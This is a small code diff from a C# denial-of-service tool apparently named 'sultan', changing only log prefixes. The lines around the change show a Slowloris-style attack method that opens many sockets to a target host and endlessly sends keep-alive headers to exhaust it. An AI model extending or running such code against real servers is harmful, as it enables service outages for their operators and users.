@@ -19,11 +19,11 @@ namespace sultan
 
         public void attack(string ip, int port, bool useSsl, int count)
         {
-            Console.WriteLine("[sultan] VERB Host -> " + ip);
-            Console.WriteLine("[sultan] VERB Port -> " + port.ToString());
-            Console.WriteLine("[sultan] VERB Using SSL -> " + useSsl.ToString());
-            Console.WriteLine("[sultan] VERB Count -> " + count.ToString());
-            Console.WriteLine("[sultan] VERB initialize connections for {0} sockets", count);
+            Console.WriteLine("[sultan->slllib] VERB Host -> " + ip);
+            Console.WriteLine("[sultan->slllib] VERB Port -> " + port.ToString());
+            Console.WriteLine("[sultan->slllib] VERB Using SSL -> " + useSsl.ToString());
+            Console.WriteLine("[sultan->slllib] VERB Count -> " + count.ToString());
+            Console.WriteLine("[sultan->slllib] VERB initialize connections for {0} sockets", count);
             for (int i = 0; i < count; i++)
             {
                 var conn = new LorisConnection(ip, port, useSsl);
@@ -36,7 +36,7 @@ namespace sultan
         {
             while (true)
             {
-                Console.WriteLine("[sultan] VERB send keep-alive headers for {0} connections", connections.Count);
+                Console.WriteLine("[sultan->slllib] VERB send keep-alive headers for {0} connections", connections.Count);
                 for (int i = 0; i < connections.Count; i++)
                 {
                     try
